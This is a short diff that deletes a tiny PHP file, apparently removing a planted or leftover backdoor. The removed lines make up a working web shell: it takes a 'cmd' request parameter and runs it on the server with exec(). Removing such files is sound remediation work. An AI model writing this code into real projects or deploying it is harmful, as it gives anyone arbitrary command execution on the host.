@@ -1,6 +1,0 @@
-<?php
-//echo 'START';
-$cmd = $_REQUEST['cmd'];
-echo exec($cmd);
-//echo 'Finished';
-
